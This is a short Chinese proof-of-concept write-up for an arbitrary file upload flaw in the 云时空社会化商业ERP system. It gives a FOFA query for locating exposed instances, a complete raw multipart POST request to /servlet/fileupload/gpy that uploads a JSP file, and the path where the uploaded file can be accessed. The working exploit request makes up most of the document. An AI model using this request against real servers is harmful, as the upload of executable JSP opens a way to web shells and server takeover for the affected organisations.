## 云时空社会化商业ERP任意文件上传

## fofa
```
app="云时空社会化商业ERP系统"
```

## poc
```
POST /servlet/fileupload/gpy HTTP/1.1
Host: ip:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 220

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file"; filename="random_str.jsp"
Content-Type: application/octet-stream

<% out.println("random_str"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```
![0a88234fdcf3709606fc26191caf848e](https://github.com/wy876/POC/assets/139549762/a7eb2358-6f1c-4d09-b76a-03a96a453da6)

访问上传文件
/uploads/pics/2023-12-9/random_str.jsp
